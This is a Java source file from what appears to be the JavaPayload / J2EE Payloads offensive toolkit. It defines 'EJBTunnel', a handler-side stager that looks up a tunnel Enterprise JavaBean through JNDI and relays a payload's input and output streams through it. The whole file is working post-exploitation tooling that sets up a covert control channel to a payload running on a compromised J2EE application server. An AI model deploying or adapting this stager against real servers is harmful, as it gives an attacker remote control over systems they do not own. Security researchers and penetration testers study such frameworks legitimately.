/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stager;

import j2eepayload.ejb.JavaPayloadTunnel;
import j2eepayload.ejb.JavaPayloadTunnelHome;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.io.PrintStream;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.rmi.PortableRemoteObject;

import javapayload.handler.stage.StageHandler;

public class EJBTunnel extends StagerHandler {

	protected void handle(StageHandler stageHandler, String[] parameters, final PrintStream errorStream, Object extraArg) throws Exception {
		PipedInputStream localIn = new PipedInputStream();
		PipedOutputStream localOut = new PipedOutputStream();
		final OutputStream out = new WrappedPipedOutputStream(new PipedOutputStream(localIn));
		final InputStream in = new PipedInputStream(localOut);

		Context ctx = new InitialContext();
		JavaPayloadTunnelHome homeObject = (JavaPayloadTunnelHome)PortableRemoteObject.narrow(ctx.lookup(JavaPayloadTunnelHome.JNDI_NAME),JavaPayloadTunnelHome.class);
		final JavaPayloadTunnel remoteObjectOut = homeObject.create(parameters);
		final JavaPayloadTunnel remoteObjectIn = homeObject.create(remoteObjectOut.separateInputToReference());
		new Thread(new Runnable() {
			public void run() {
				try {
					try {
						while (true) {
							byte[] buf = remoteObjectIn.read(4096);
							if (buf == null)
								break;
							out.write(buf, 0, buf.length);
							if (remoteObjectIn.available() == 0) {
								out.flush();
							}
						}
					} finally {
						remoteObjectIn.closeIn();
						out.close();
					}
				} catch (Exception ex) {
					ex.printStackTrace(errorStream);
				}
			}
		}).start();
		new Thread(new Runnable() {
			public void run() {
				try {
					try {
						final byte[] buf = new byte[4096];
						int length;
						while ((length = in.read(buf)) != -1) {
							remoteObjectOut.write(buf, 0, length);
							if (in.available() == 0) {
								remoteObjectOut.flush();
							}
						}
					} finally {
						in.close();
						remoteObjectOut.closeOut();
					}
				} catch (Exception ex) {
					ex.printStackTrace(errorStream);
				}
			}
		}).start();
		stageHandler.handle(new WrappedPipedOutputStream(localOut), localIn, parameters);
	}
	
	protected boolean needHandleBeforeStart() {
		throw new IllegalStateException("No extra handler needed");
	}
}
